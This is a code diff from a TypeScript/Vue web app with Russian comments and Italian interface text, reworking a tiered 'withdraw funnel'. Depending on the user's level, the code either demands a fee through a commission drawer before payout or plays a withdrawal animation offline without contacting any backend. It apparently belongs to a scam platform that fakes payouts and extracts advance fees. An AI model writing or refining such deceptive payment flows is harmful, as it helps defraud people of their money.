@@ -310,26 +310,24 @@ function openContractSign(): void {
 }
 
 /**
- * Старт воронки после суммы.
- * L2: сразу animating + информационное окно банка.
- * L4: анимация отказа (обязательно Home + phase animating).
- * L1 / fee → beginWithdraw → pay_fee → drawer комиссии.
+ * Старт воронки после «Avvia» в выпадающей панели.
+ * L2 / L4: сразу phase=animating + сцена на Home (без API, без ожидания бэка).
+ * L1 / L3: pay_fee → drawer.
  */
 function startWithdrawFunnel(): void {
   selectTab('home')
-  const lv = Number(level.value)
+  payoutPanelOpen.value = false
 
-  if (lv === 2) {
+  const lv = normalizeLevel()
+
+  /* L2 / L4 — сразу сцена анимации на Home (без API, без bank-notice) */
+  if (lv === 2 || lv === 4) {
     beginWithdraw()
-    bankNoticeOpen.value = true
+    bankNoticeOpen.value = false
     return
   }
 
-  /* L4 (и запасной путь): анимация перевода */
-  const ok = beginWithdraw()
-  if (!ok && (lv === 2 || lv === 4) && phase.value === 'ready') {
-    beginWithdraw()
-  }
+  beginWithdraw()
 }
 
 /**
@@ -414,7 +412,7 @@ function onWithdraw(): void {
   payoutPanelOpen.value = true
 }
 
-/** После панели или сразу (если IBAN есть) → drawer / анимация по уровню. */
+/** После «Avvia» в панели → drawer (L1/L3) или анимация вывода (L2/L4). */
 function continueAfterPayout(euros: number): void {
   withdrawAmount.value = Math.max(0, Math.round(euros))
   if (withdrawAmount.value <= 0) {
@@ -422,17 +420,22 @@ function continueAfterPayout(euros: number): void {
   }
   payoutPanelOpen.value = false
 
-  const lv = Number(level.value)
+  const lv = normalizeLevel()
 
-  // L1 / L3 / страховка: pay_fee → drawer (IBAN-шаг пропускается, если уже есть).
+  // L1 / L3 / страховка: pay_fee → drawer
   if (lv === 1 || lv === 3 || isSuspended.value) {
     if (!isPayFee.value) beginWithdraw()
     commissionOpen.value = true
     return
   }
 
-  // L2 / L4: банк-уведомление или анимация.
+  // L2 / L4: сразу анимация (offline), без запросов к API
   startWithdrawFunnel()
+}
+
+function normalizeLevel(): number {
+  const n = Number(level.value)
+  return Number.isFinite(n) && n >= 1 && n <= 4 ? n : 1
 }
 
 function onPayoutSubmitted(euros: number): void {
